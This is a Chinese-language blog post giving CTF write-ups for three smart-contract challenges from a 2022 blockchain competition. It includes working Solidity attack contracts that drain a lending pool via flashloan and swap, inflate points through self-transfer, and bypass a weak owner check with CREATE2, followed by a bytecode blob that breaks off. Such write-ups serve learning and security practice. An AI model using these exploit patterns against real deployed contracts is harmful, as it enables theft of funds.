@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="可信链大赛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022中国可信区块链大赛初赛赛题全解">
+<meta property="og:url" content="http://example.com/2022/12/01/2022%E4%B8%AD%E5%9B%BD%E5%8F%AF%E4%BF%A1%E5%8C%BA%E5%9D%97%E9%93%BE%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E8%B5%9B%E9%A2%98%E5%85%A8%E8%A7%A3/index.html">
+<meta property="og:site_name" content="lucifer&#39;s blog">
+<meta property="og:description" content="可信链大赛">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e6205c1414b443ddab0f210e25eeba81.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d872bba18f844d2e83dcaeecda90d308.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a9ce4b4b875b4ee2961b4308f724350b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9b58a4c7e797406f8bf8554bc5df8f05.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2f4c54c0c230476395b5693184cc3f0b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/71cdf5851e8e4021888bec40dc7ac9ee.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b4bffabb653342b9bdfcb7c6feb6f019.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e58beff2fc3d43ad98d81ab687f5b089.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ad22436cdef94c84994e0454fbc78c6a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/546eb61b1ffe454fbf79f854bdc455ec.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1e63fe450c734da1a111ae67314a1460.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f5d682439e3f473281a3bf1cd38a6761.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a5267847fdb74b6e80bec8daa52194fb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/60475fada6be4eefaa793651184ed4c8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5f61abc329bc4d02bb63aab4a0d0502f.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/30b50f8c5df74a7ba7b7c4c9e20b81bb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3b7595d98c364fbba940c14bc4397a7d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/12ce5c19743b4f1cbb938f168174d4d2.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9037ef79812442dca71bba02c01df2a6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e9ff3f53be3548b7b4d3e91cd0f0cc4c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b3c2e7738f4f4ccf8e13cf8a439577e8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5b5eb3a9373e4413912d912170b7ba2d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/29d77bbcdc914801942e9e2166e40d9d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/81adfd141d0b48429c24272bb3005857.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7344f7e30d454059bc729e9fcd527eff.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/877e4a9c932448a79cb2702b44012a03.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/97124ade47f946bb9a1cc199d2d919d6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e2a1f947dbcf4893b7fc95d938cdf9de.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5f3907dc836d4aa0ab5513d6d7fed81e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/51add765ff1d468783cae3040a87eb30.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/69a2e6cc42454be2ac03614d796329d1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/39280514825d4d3db4f06d773160ddd1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7ed5cffd83f14ef3a0a2cb3dbe0ff32a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d3c0b6e9260a48e18e3d4db9bd331e91.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/747201b55692446c90436b4ad211ccce.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ade904bfaabe4c3e932020ce432887d5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/66ed0469976a42d2998f94dc38c33853.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1cc2885f9ae84ef58ebf67a4a0e78e0e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9b724f632b764c65bcda4e0b8e3c3141.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/418f5f802f6b42189f31f852e4982831.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a0a0abac89c5489f834628e7c3bd8995.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9bc7f0d075f040c5ba7193a3c1018d9e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e82cafa3f58e4d4c88e8bcab5ed55102.png">
+<meta property="article:published_time" content="2022-12-01T06:41:23.000Z">
+<meta property="article:modified_time" content="2022-12-01T07:09:43.182Z">
+<meta property="article:author" content="lucifer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/e6205c1414b443ddab0f210e25eeba81.png">
+
+<link rel="canonical" href="http://example.com/2022/12/01/2022%E4%B8%AD%E5%9B%BD%E5%8F%AF%E4%BF%A1%E5%8C%BA%E5%9D%97%E9%93%BE%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E8%B5%9B%E9%A2%98%E5%85%A8%E8%A7%A3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2022中国可信区块链大赛初赛赛题全解 | lucifer's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lucifer's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/01/2022%E4%B8%AD%E5%9B%BD%E5%8F%AF%E4%BF%A1%E5%8C%BA%E5%9D%97%E9%93%BE%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E8%B5%9B%E9%A2%98%E5%85%A8%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lucifer">
+      <meta itemprop="description" content="我的老婆严菡是猪">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lucifer's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2022中国可信区块链大赛初赛赛题全解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-01 14:41:23 / 修改时间：15:09:43" itemprop="dateCreated datePublished" datetime="2022-12-01T14:41:23+08:00">2022-12-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>21k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>19 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>可信链大赛<br> <span id="more"></span><br>所有的题目我都放在了<a target="_blank" rel="noopener" href="https://github.com/luciferzxj/kexinlian">代码仓库</a>，由于太长就不放入wp了，感兴趣的可自行移步。<br>@<a href="%E9%A2%98%E7%9B%AE%E9%A2%84%E8%A7%88">TOC</a></p>
+<h1 id="TrusterLenderPool"><a href="#TrusterLenderPool" class="headerlink" title="TrusterLenderPool"></a>TrusterLenderPool</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本次大赛的第一题，也是相对来说难度相对较低的一道题<br><img src="https://img-blog.csdnimg.cn/e6205c1414b443ddab0f210e25eeba81.png" alt="在这里插入图片描述"><br>目的是成功调用Complete函数，也就要求我们拿走合约的所有token0余额。<br><img src="https://img-blog.csdnimg.cn/d872bba18f844d2e83dcaeecda90d308.png" alt="在这里插入图片描述"><br>合约创建之初拥有10100个token，拥有两个函数，一个flashloan，一个swap。<br>看完合约思路就已经很清晰了，用flashloan借钱，再用swap换成token1，在swap的过程中就已经完成了flashloan还钱的操作，最后再用手中的token1换走合约中的token0即可完成攻击。</p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.1</span>;</span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./TrusterLenderPool.sol&quot;</span>;</span><br><span class="line">contract poolAttack&#123;</span><br><span class="line">    <span class="title class_">TrusterLenderPool</span> public pool;</span><br><span class="line">    <span class="title class_">Cert</span> public token0;</span><br><span class="line">    <span class="title class_">Cert</span> public token1;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _pool</span>)&#123;</span><br><span class="line">        pool = <span class="title class_">TrusterLenderPool</span>(_pool);</span><br><span class="line">        token0=pool.<span class="title function_">token0</span>();</span><br><span class="line">        token1 = pool.<span class="title function_">token1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">loan</span>(<span class="params">uint256 amount</span>)public&#123;</span><br><span class="line">        pool.<span class="title function_">flashLoan</span>(amount,<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        token1.<span class="title function_">approve</span>(<span class="title function_">address</span>(pool),amount);</span><br><span class="line">        pool.<span class="title function_">swap</span>(<span class="title function_">address</span>(token0),amount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveEther</span>(<span class="params">uint256 amount</span>)public&#123;</span><br><span class="line">        token0.<span class="title function_">approve</span>(<span class="title function_">address</span>(pool),amount);</span><br><span class="line">        pool.<span class="title function_">swap</span>(<span class="title function_">address</span>(token1),amount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// function ended(uint256 amount)public&#123;</span></span><br><span class="line">    <span class="comment">//     token1.approve(address(pool),amount);</span></span><br><span class="line">    <span class="comment">//     pool.swap(address(token0),amount);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="title function_">fallback</span>()external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接调用loan传入10100*10**18即可完成攻击。<br><img src="https://img-blog.csdnimg.cn/a9ce4b4b875b4ee2961b4308f724350b.png" alt="在这里插入图片描述"></p>
+<h1 id="SVip"><a href="#SVip" class="headerlink" title="SVip"></a>SVip</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><img src="https://img-blog.csdnimg.cn/9b58a4c7e797406f8bf8554bc5df8f05.png" alt="在这里插入图片描述"><br>要求我们成为SuperVip，就是要求我们成功调用promotionSVip函数<br><img src="https://img-blog.csdnimg.cn/2f4c54c0c230476395b5693184cc3f0b.png" alt="在这里插入图片描述"><br>合约几个函数很简单，getPoint可以给我们一百个point，transferPoints可以进行point间的转账。很容易能够注意到tansferPoints使用了中间变量来存储转账前 的余额，如果我们的调用者和接受者为同一地址，就等于没扣余额。</p>
+<h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./SVip.sol&quot;</span>;</span><br><span class="line">contract svipAttack&#123;</span><br><span class="line">    <span class="title class_">SVip</span> sv;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _addr</span>)&#123;</span><br><span class="line">        sv = <span class="title class_">SVip</span>(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        <span class="keyword">for</span>(uint i =<span class="number">0</span>;i&lt;<span class="number">99</span>;i++)&#123;</span><br><span class="line">            sv.<span class="title function_">getPoint</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        <span class="keyword">for</span>(uint i=<span class="number">0</span>;i&lt;<span class="number">11</span>;i++)&#123;</span><br><span class="line">            sv.<span class="title function_">transferPoints</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>),<span class="number">98</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sv.<span class="title function_">transferPoints</span>(msg.<span class="property">sender</span>,<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用自己的账户调用一次getPoints，然后调用get和transfer，最后调用题目的promotionSVip即可完成攻击。<br><img src="https://img-blog.csdnimg.cn/71cdf5851e8e4021888bec40dc7ac9ee.png" alt="在这里插入图片描述"></p>
+<h1 id="Merkle"><a href="#Merkle" class="headerlink" title="Merkle"></a>Merkle</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p><img src="https://img-blog.csdnimg.cn/b4bffabb653342b9bdfcb7c6feb6f019.png" alt="在这里插入图片描述"><br>题目需要我们把合约初始化的一个ether全拿出来。<br>而想要取钱就需要调用withdraw函数，要成功转账则需要我们是merkleTree白名单中的一员，而合约初始化时我们肯定不在其中，这时候就需要调用setMerkleroot设定新的根节点。</p>
+<p>此合约的onlyOwner只检查了调用者地址的前两位，很容易想到creat2来创建攻击合约。</p>
+<p>这时候思路就很明确了，利用creat2创建跟owner前两位相同的合约，然后设定包含该地址的root，然后直接转账即可。</p>
+<h2 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./Merkle.sol&quot;</span>;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    <span class="title class_">Merkle</span> merk;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params">address _addr</span>)public&#123;</span><br><span class="line">        merk = <span class="title class_">Merkle</span>(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">att</span>(<span class="params">bytes32 root</span>)public payable&#123;</span><br><span class="line">        bytes32[] memory proof = <span class="keyword">new</span> bytes32[](<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// [0x0011223344556677889900112233445566778899001122334455667788990011,0x0011223344556677889900112233445566778899001122334455667788990022];</span></span><br><span class="line">        proof[<span class="number">0</span>]=<span class="number">0x0011223344556677889900112233445566778899001122334455667788990011</span>;</span><br><span class="line">        proof[<span class="number">1</span>]=<span class="number">0x0011223344556677889900112233445566778899001122334455667788990022</span>;</span><br><span class="line">        merk.<span class="title function_">setMerkleroot</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">att2</span>(<span class="params"></span>)public &#123;</span><br><span class="line">        bytes32[] memory proof = <span class="keyword">new</span> bytes32[](<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// [0x0011223344556677889900112233445566778899001122334455667788990011,0x0011223344556677889900112233445566778899001122334455667788990022];</span></span><br><span class="line">        proof[<span class="number">0</span>]=<span class="number">0x0011223344556677889900112233445566778899001122334455667788990011</span>;</span><br><span class="line">        proof[<span class="number">1</span>]=<span class="number">0x0011223344556677889900112233445566778899001122334455667788990022</span>;</span><br><span class="line">        merk.<span class="title function_">withdraw</span>(proof,<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">figure</span>(<span class="params"></span>)public <span class="title function_">returns</span>(<span class="params">bytes32</span>)&#123;</span><br><span class="line">        bytes32[] memory proof = <span class="keyword">new</span> bytes32[](<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// [0x0011223344556677889900112233445566778899001122334455667788990011,0x0011223344556677889900112233445566778899001122334455667788990022];</span></span><br><span class="line">        proof[<span class="number">0</span>]=<span class="number">0x0011223344556677889900112233445566778899001122334455667788990011</span>;</span><br><span class="line">        proof[<span class="number">1</span>]=<span class="number">0x0011223344556677889900112233445566778899001122334455667788990022</span>;</span><br><span class="line">        bytes32 computedHash = <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">        <span class="comment">// bytes32 computedHash = msg.sender;</span></span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; proof.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            bytes32 proofElement = proof[i];</span><br><span class="line">            <span class="keyword">if</span> (computedHash &lt;= proofElement) &#123;</span><br><span class="line">                <span class="comment">// Hash(current computed hash + current element of the proof)</span></span><br><span class="line">                computedHash = <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(computedHash, proofElement));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Hash(current element of the proof + current computed hash)</span></span><br><span class="line">                computedHash = <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(proofElement, computedHash));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> computedHash;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">fallback</span>()external payable&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// contract figure&#123;</span></span><br><span class="line"><span class="comment">//     bytes20 public mask;</span></span><br><span class="line"><span class="comment">//     constructor()&#123;</span></span><br><span class="line"><span class="comment">//         mask = hex&quot;ff00000000000000000000000000000000000000&quot;;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>部署合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract deployed&#123;</span><br><span class="line">    </span><br><span class="line">    bytes contractBytecode = hex<span class="string">&quot;608060405234801561001057600080fd5b5061065b806100206000396000f3fe6080604052600436106100435760003560e01c806312c973c11461004657806313b6ae4c1461007457806319ab453c1461009f57806338a39681146100f057610044565b5b005b6100726004803603602081101561005c57600080fd5b8101908080359060200190929190505050610107565b005b34801561008057600080fd5b5061008961025a565b6040518082815260200191505060405180910390f35b3480156100ab57600080fd5b506100ee600480360360208110156100c257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061040d565b005b3480156100fc57600080fd5b50610105610450565b005b6000600267ffffffffffffffff8111801561012157600080fd5b506040519080825280602002602001820160405280156101505781602001602082028036833780820191505090505b5090507e1122334455667788990011223344556677889900112233445566778899001160001b8160008151811061018357fe5b6020026020010181815250507e1122334455667788990011223344556677889900112233445566778899002260001b816001815181106101bf57fe5b60200260200101818152505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166392f6c439836040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561023e57600080fd5b505af1158015610252573d6000803e3d6000fd5b505050505050565b600080600267ffffffffffffffff8111801561027557600080fd5b506040519080825280602002602001820160405280156102a45781602001602082028036833780820191505090505b5090507e1122334455667788990011223344556677889900112233445566778899001160001b816000815181106102d757fe5b6020026020010181815250507e1122334455667788990011223344556677889900112233445566778899002260001b8160018151811061031357fe5b602002602001018181525050600030604051602001808273ffffffffffffffffffffffffffffffffffffffff1660601b815260140191505060405160208183030381529060405280519060200120905060005b825181101561040457600083828151811061037d57fe5b602002602001015190508083116103c457828160405160200180838152602001828152602001925050506040516020818303038152906040528051906020012092506103f6565b808360405160200180838152602001828152602001925050506040516020818303038152906040528051906020012092505b508080600101915050610366565b50809250505090565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000600267ffffffffffffffff8111801561046a57600080fd5b506040519080825280602002602001820160405280156104995781602001602082028036833780820191505090505b5090507e1122334455667788990011223344556677889900112233445566778899001160001b816000815181106104cc57fe5b6020026020010181815250507e1122334455667788990011223344556677889900112233445566778899002260001b8160018151811061050857fe5b60200260200101818152505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166338be559282306040518363ffffffff1660e01b815260040180806020018373ffffffffffffffffffffffffffffffffffffffff168152602001828103825284818151815260200191508051906020019060200280838360005b838110156105c05780820151818401526020810190506105a5565b505050509050019350505050602060405180830381600087803b1580156105e657600080fd5b505af11580156105fa573d6000803e3d6000fd5b505050506040513d602081101561061057600080fd5b8101908080519060200190929190505050505056fea2646970667358221220372540e23ad43e92c3